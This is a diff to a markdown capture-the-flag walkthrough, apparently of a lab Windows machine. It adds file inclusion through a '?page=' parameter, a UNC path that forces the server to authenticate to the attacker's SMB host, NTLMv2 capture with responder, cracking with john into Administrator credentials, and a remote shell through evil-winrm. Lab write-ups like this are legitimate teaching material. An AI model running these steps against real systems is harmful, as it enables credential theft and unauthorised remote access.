@@ -58,7 +58,7 @@ Whats interesting about that is the url. I see that it changes to include a `?pa
 
 <img width="1132" height="229" alt="image" src="https://github.com/user-attachments/assets/5bd11131-3d9b-4660-8eb8-3ddbdec0b22d" />   
 
-included([FILE NAME])... `C:\xampp\htdocs\index.php` Does this service just let us search/navigate the windows file system? 
+included([FILE NAME])... `C:\xampp\htdocs\index.php` Does this service just let us do directory traversal?   
 
 So what do we know? 
 * This server is letting us attempt to include files on the page based on the url parameter `?page=`
@@ -74,16 +74,66 @@ Let's begin throwing these after the `?page=..` entry...
 
 <img width="1272" height="822" alt="image" src="https://github.com/user-attachments/assets/a84d27b8-9b00-4e11-a4fa-2766a2b5328f" />     
 
-`..\apache\conf\httpd.conf` worked! This gives us the server configuration file. Lots to take in here. Let's see if we can go back past the C:\xampp\ folder... to C:\
+`..\apache\conf\httpd.conf` worked! This gives us the server configuration file. Lots to take in here. Let's see if we can can access the php configuration file `php.ini` which is said to be stored at `C:\xampp\php\php.ini` ([source](https://stackoverflow.com/questions/6185319/how-to-locate-the-php-ini-file-xampp))
 
-<img width="999" height="222" alt="image" src="https://github.com/user-attachments/assets/1a7768d7-f4aa-44bb-a6cf-7a6d8e0d30c9" />  
+<img width="943" height="159" alt="image" src="https://github.com/user-attachments/assets/f0a6df1e-3170-447a-b535-d9ca08304f3e" />    
 
-Oh we can try searching anywhere on the NTFS and maybe more.
+Hmm... doesn't seem to want to load. Let's try loading a .jpg file of a smiley face:
+
+<img width="1199" height="259" alt="image" src="https://github.com/user-attachments/assets/f43f2916-a005-4d7a-ab94-abe180929e54" />   
+
+disabled by configuration file' `allow_url_include = 0` option... Let's look at what a php.ini config file looks like by default to test the other possible loads.
+
+<img width="939" height="675" alt="image" src="https://github.com/user-attachments/assets/bd722951-fc55-44b6-b76f-8852a08c39c9" />  
 
 
+<img width="757" height="259" alt="image" src="https://github.com/user-attachments/assets/2986f35e-1c48-4ea9-bbf4-d64abf384982" />  
 
+If both allow_url_include and allow_url_fopen are set to OFF, it won't allow us to load http or ftp links in the url... but what about \\SMB\file links? If we try and force the web server to authenticate to an SMB server via an SMB link, we could use a tool to capture the authentication challenge response (NTLMv2 "hash"). Knowing what the challenge was, we can attempt to brute-force the resposne part by hashing the challenge with a bunch of our own passwords to see if we can an output that matches. Remember that the authentication sequence goes like:
 
+1. The client sends the user name and domain name to the server.
+2. The server generates a random character string, referred to as the challenge.
+3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the server.
+4. The server retrieves the user password (or equivalent).
+5. The server uses the hash value retrieved from the security account database to encrypt the challenge string. The value is then compared to the value received from the client. If the values match, the client is authenticated.
 
+The tool we can use to capture the authentication requests is called `responder`. Let's go ahead and make sure the configuration (found in /etc/Responder/) is going to start an SMB server.   
+
+<img width="658" height="516" alt="image" src="https://github.com/user-attachments/assets/f62632f3-ba7c-4be2-9db9-2e8e07eb4050" />   
+
+Perfect. Now let's make sure it'll capture from the correct network interface card. I'll set `responder -I tun0`   
+
+<img width="763" height="1237" alt="image" src="https://github.com/user-attachments/assets/84bd3102-d02c-4e00-ba1a-e6052af85bff" />     
+
+Now let's go ahead and launch it and load it in the url's `?page=//[serverip]/literally_anything_because_its_just_for_auth.txt`   
+
+<img width="695" height="1142" alt="image" src="https://github.com/user-attachments/assets/a5c1fd6a-6ab4-49f4-9b29-a539667329f7" />       
+
+<img width="1401" height="288" alt="image" src="https://github.com/user-attachments/assets/63046612-2c67-4cd2-a2d4-694fe439a134" />      
+
+<img width="1117" height="257" alt="image" src="https://github.com/user-attachments/assets/960ad71b-4fc5-4588-9bae-6206b0939af0" />      
+
+Now, let's get this NTLMv2 "hash" into a text file and pipe it to john the ripper to begin cracking. (Again, it's going to take the challenge code that it sent to RESPONDER\Administrator and attempt to hash it with random passwords until it gets a match)   
+
+<img width="1101" height="132" alt="image" src="https://github.com/user-attachments/assets/299b0435-043c-4f32-8b95-d5f77857ca46" />     
+
+In order to crack it, we'll need to specify the wordlist to throw at it. Let's just go with the good ol' rockyou.txt : `john -w [wordlist] crackme.txt`  (if you have troubles with rockyou.txt, do `locate rockyou.txt` You may need to gunzip it and/or download it from the internet)   
+ 
+<img width="798" height="350" alt="image" src="https://github.com/user-attachments/assets/75250d15-3005-4cef-b41e-193eb80f1a37" />     
+  
+Almost instantly we see that it loads the NTLMv2 hash and cracks the password "badminton". `Creds: Administrator / badminton`   
+
+Now thinking back, the only other service open on this device was WinRM (HTTPAPI on 5985). This protocol allows credentialed ussers to remotely manage a system and likely give shells (PS). Normally we'd use Powershell to connect to the service, but since we're on a linux system we have to use another varient called EvilWinRM.   
+ 
+<img width="1107" height="450" alt="image" src="https://github.com/user-attachments/assets/d4bf54f0-5fdd-4d45-abaa-e305de617e8f" />    
+
+We see that basic syntax follows: `evil-winrm -i IP_ADDR -u username -p password`
+
+<img width="1080" height="196" alt="image" src="https://github.com/user-attachments/assets/338bc264-80f9-4070-8915-e80e25e3dde6" />   
+
+Just like that, we got a Powershell console on the WinRM service. Let's go ahead and start looking through user files.
+
+<img width="768" height="1098" alt="image" src="https://github.com/user-attachments/assets/80275f79-897d-466a-a68c-61cfbc9d5d42" />  
 
 
 
